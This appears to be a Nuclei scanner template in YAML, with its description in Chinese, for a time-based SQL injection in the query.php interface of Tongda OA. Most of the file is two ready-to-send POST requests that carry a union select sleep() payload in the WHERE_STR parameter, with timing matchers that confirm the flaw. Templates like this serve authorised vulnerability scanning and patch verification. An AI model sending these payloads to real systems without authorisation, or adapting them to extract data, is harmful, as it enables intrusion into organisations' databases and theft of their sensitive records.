id: tongda-oa-queryphp-sql
info:
  name: "通达OA query.php接口SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    北京通达信科科技有限公司通达OA系统中query.php接口存在SQL注入缺陷，该漏洞可能允许攻击者通过构造恶意请求获取数据库敏感信息。(延时注入测试)
  tags: 通达
http:
- raw:
  - |
    POST /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    WHERE_STR=-@`'` union select 1,2,sleep(5)#'&
  - |
    POST /general/management_center/portal/oa_engine/engine_manage_bulletin_number/query.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    WHERE_STR=-@`'` union select 1,2,sleep(8)#'&
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
